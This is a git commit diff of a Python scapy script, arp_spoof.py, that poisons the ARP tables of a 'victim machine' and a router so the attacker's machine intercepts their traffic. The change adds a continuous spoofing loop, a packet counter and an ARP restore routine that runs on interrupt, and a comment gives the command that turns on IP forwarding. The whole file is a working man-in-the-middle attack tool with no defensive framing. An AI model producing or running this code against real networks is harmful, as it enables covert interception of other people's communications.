10f1df64fe0601a7a14ecffbc99361a667985cb7
Nirolfix <florinstamate@gmail.com>
2019-12-06 21:18:05 +0100

    arp spoof END

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,5 +1,6 @@
 #!usr/bin/python3
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -18,22 +19,44 @@ def get_mac(ip):
 
 
 # packet prepared --> Kali machine become the router
-# e.g.: target_ip=192.168.82.219(victim machine)
-# e.g.: router_ip=192.168.82.209(gateway/router machine)
+# eg.: target_ip=192.168.82.219(victim machine)
+# eg.: router_ip=192.168.82.209(gateway/router machine)
+# arp -a to print ARP table of a machine
 
 def spoof(target_ip, router_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
 
     # send the packet to spoof the victim
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
     # print(packet.show())
     # print(packet.summary())
 
-# maintain the spoof as long as I want 
-# but we need to forward ports to give inernet to the victim machine
+# restore ARP table of a victim machine and router
+
+
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=src_ip, hwsrc=src_mac)
+    # send the packet to spoof the victim
+    scapy.send(packet, count=4, verbose=False)
+
+victim_ip ='192.168.28.41'
+router_ip ='192.168.28.33'
+
+# maintain the spoof as long as I want ^C to interrupt
+# but we need to forward ports to give internet to the victim machine
 # echo 1 > /proc/sys/net/ipv4/ip_forward
-while True:
-    spoof('192.168.82.219', '192.168.82.209')
-    spoof('192.168.82.209', '192.168.82.219')
-    time.sleep(2)
+sent_packet_count = 0
+try:
+    while True:
+        spoof(victim_ip, router_ip)
+        spoof(router_ip, victim_ip)
+        sent_packet_count = sent_packet_count + 2
+        print('\r[+] Packets sent ' + str(sent_packet_count), end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    restore(victim_ip, router_ip)
+    print('\n[+] Detected CTRL + C ... Quitting and Restore ARP table.')
